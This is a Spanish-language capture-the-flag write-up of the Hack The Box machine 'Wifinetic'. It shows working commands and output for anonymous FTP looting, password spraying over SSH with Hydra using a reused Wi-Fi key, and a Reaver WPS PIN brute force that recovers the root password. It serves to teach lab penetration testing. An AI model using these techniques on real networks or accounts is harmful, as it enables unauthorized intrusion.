---
layout: post
title: HTB Wifinetic
date: '2023-11-05 16:50:41 -0500'
categories: [HTB, Easy]
tags: [Wifi,Linux, Reaver, WPS, Capabilities , SSH, FTP ,Wireless ] 
image:
  path: /wifinetic/preview.png
  alt: Wifinetic
---


## Resumen
![logo](/wifinetic/logo.png){: .right w="200" h="200" }

**Wifinetic** fue una máquina fácil y divertida de realizar. La intrusión consiste en explorar un servidor **FTP** que cuenta con acceso **anónimo**. Después de eso, se encuentra un archivo que contiene una lista de **usuarios del sistema** y otro que parece ser una **credencial**. Al intentar iniciar sesión por **SSH**, se obtiene acceso al sistema. Posteriormente, al revisar las **capabilities** del host, se descubre que el programa **Reaver** está presente, lo que sugiere la posibilidad de realizar un ataque **WiFi**. Con esta información, se examinan las interfaces de red y se observa que el equipo tiene una **IP** de un **gateway**. Además, existe una interfaz que cuenta con capacidades de **monitoreo**. Gracias a esto, se puede llevar a cabo el ataque y obtener las contraseñas del usuario **root**. En mi opinión, fue una máquina **excelente** que me obligó a salir un poco de mi zona de confort y aprender sobre ataques inalámbricos para enumerar una clase de información diferente dentro del equipo y lograr completar la máquina.

## Reconocimiento

Para comenzar, se realiza un ping para verificar la conectividad con la máquina

```bash
ping -c 1 10.10.11.247

PING 10.10.11.247 (10.10.11.247) 56(84) bytes of data.
64 bytes from 10.10.11.247: icmp_seq=1 ttl=63 time=261 ms

--- 10.10.11.247 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```
{: .nolineno}


## Escaneo de Puertos

Ahora es necesario revisar qué puertos están abiertos, para luego identificar las tecnologías y versiones que se están ejecutando en ellos.Para comenzar, se puede ejecutar el siguiente comando para visualizar los puertos:

```bash
nmap -p- --min-rate 2000 10.10.11.247 -Pn -oG ports

Nmap scan report for 10.10.11.247 (10.10.11.247)
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain
```
{: .nolineno}



Después, se pueden ver las versiones que se ejecutan en cada uno con el siguiente comando:


```bash
nmap -p21,22,53 -sVC 10.10.11.247 -Pn -oN versions
Nmap scan report for 10.10.11.247 (10.10.11.247)
Host is up (0.26s latency).

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.100
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
{: .nolineno}


>Es una buena idea guardar toda la información obtenida en archivos en caso de que sea necesaria en el futuro.
{: .prompt-tip}

## Enumeración

### FTP
Según la información proporcionada por **Nmap**, el servidor **FTP** cuenta con la posibilidad de conectarse sin usar **contraseña** con el usuario **anonymous**. Por lo tanto, se puede realizar lo siguiente:

```bash
ftp anonymous@10.10.11.247
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
{: .nolineno}

Ahora que se cuenta con acceso, se pueden listar los archivos con el comando **dir**, para luego traerlos todos al servidor de atacante con **mget**.


```bash
ftp> dir
229 Entering Extended Passive Mode (|||43044|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
ftp> mget *
```

Al extraer el archivo **.tar**, se puede observar que contiene información variada y relevante, como varios **archivos de configuración** del servidor y otros documentos importantes. Entre los archivos más relevantes se encuentra lo siguiente:

El archivo **/etc/passwd** del Host.


 ```bash
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
 ```
 {: .nolineno file="/etc/passwd"}

A partir de esto, se pueden extraer algunos nombres de usuarios que podrían formar parte del equipo.


Por otro lado, dentro de la carpeta **config** se encuentra un archivo llamado **wireless** en el que se guarda una **contraseña**.

```bash

config wifi-device 'radio0'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim0'
	option cell_density '0'
	option channel 'auto'
	option band '2g'
	option txpower '20'

config wifi-device 'radio1'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim1'
	option channel '36'
	option band '5g'
	option htmode 'HE80'
	option cell_density '0'

config wifi-iface 'wifinet0'
	option device 'radio0'
	option mode 'ap'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
	option wps_pushbutton '1'

config wifi-iface 'wifinet1'
	option device 'radio1'
	option mode 'sta'
	option network 'wwan'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
```
{: .nolineno file="wireless"}

## Explotación

Con esto en mente, se puede suponer que algún **usuario** tal vez haga uso de la contraseña **VeRyUniUqWiFIPasswrd1!**. Para esto se puede realizar la validación por medio del servicio **SSH**, mediante Hydra.

Para hacer esto, es necesario extraer los usuarios del archivo, pero para evitar hacerlo manualmente, se puede utilizar la herramienta 'awk' con el siguiente comando:

```bash
cat passwd  | awk '{print $1}' FS=":" > usuarios  ; cat usuarios
```
{: .nolineno}


```bash
root
daemon
ftp
network
nobody
ntp
dnsmasq
logd
ubus
netadmin
```
{: file="usuarios"}


Ahora solo hace falta ejecutar el siguiente comando de Hydra para probar la conexión:

```bash
hydra -L usuarios -p VeRyUniUqWiFIPasswrd1!  10.10.11.247  ssh
```
{: .nolineno}


```bash
[22][ssh] host: 10.10.11.247   login: netadmin   password: VeRyUniUqWiFIPasswrd1!
1 of 1 target successfully completed, 1 valid password found
```
{: .nolineno}

Por lo tanto, se puede ingresar al equipo haciendo uso de esas credenciales.


```bash
ssh netadmin@10.10.11.247
netadmin@10.10.11.247's password: VeRyUniUqWiFIPasswrd1!

Last login: Tue Sep 12 12:46:00 2023 from 10.10.14.23
netadmin@wifinetic:~$
```

## Escalada de Privilegios

Al listar las **capabilities**, se puede ver lo siguiente:

>Las capacidades de **Linux** proporcionan un subconjunto de los **privilegios de root** disponibles a un proceso.
{: .prompt-info}


```bash
getcap -r / 2>/dev/null

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```
{: .nolineno}

En lo anterior, un programa que no es común es **reaver**, así que vamos a investigar para qué sirve.

>Reaver es una herramienta que permite realizar ataques de fuerza bruta contra puntos de acceso que tienen activado el WPS (Wifi Protected Setup)
{: .prompt-info}

Por lo que se puede pensar que es necesario realizar algún ataque a alguna **red** que se encuentre disponible. Para esto, vamos a revisar las **interfaces** de red con las que cuenta el equipo, para ver si tiene múltiples redes.

```bash
ifconfig
```
{: .nolineno}


```bash
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:d811  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:d811  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:d8:11  txqueuelen 1000  (Ethernet)
        RX packets 74803  bytes 5626235 (5.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 73182  bytes 4785461 (4.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18518  bytes 1111880 (1.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18518  bytes 1111880 (1.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 81878  bytes 14415672 (14.4 MB)
        RX errors 0  dropped 81878  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 2738  bytes 258324 (258.3 KB)
        RX errors 0  dropped 375  overruns 0  frame 0
        TX packets 3183  bytes 369149 (369.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 811  bytes 112035 (112.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2738  bytes 307608 (307.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```
{: .nolineno}

Al revisar la información proporcionada, se pueden observar varios puntos interesantes, como por ejemplo:

- Las **interfaces wlan0** y **wlan1** pertenecen a la misma red. Sin embargo, la **wlan0** tiene la dirección de red **.1**, que comúnmente pertenece al **gateway**. Por lo tanto, si se quiere realizar un ataque, la dirección **MAC** de este equipo sería BSSID (Identificador de red)."

- Existe una interfaz llamada **mon0** y, al investigar un poco en internet, parece que las interfaces que cuentan con este nombre comúnmente se utilizan para la tarea de monitorear la red. Por lo tanto, puede ser clave para realizar un ataque con **reaver**

Por lo tanto, se concluye que se puede realizar un ataque a la red a la que pertenece la interfaz wlan0 mediante la interfaz mon0, con la ayuda de la herramienta Reaver. Esto se puede hacer con el siguiente comando:

```bash
reaver -b 02:00:00:00:00:00 -i mon0 -v

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[!] Found packet with bad FCS, skipping...
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Trying pin "12345670"
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Trying pin "12345670"
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
netadmin@wifinetic:~$
```
{: .nolineno}

Ahora, con la credencial obtenida, puedes intentar conectarte como usuario **root** al equipo

```bash
ssh root@10.10.11.247
root@10.10.11.247's password: WhatIsRealAnDWhAtIsNot51121!
root@wifinetic:~#
```


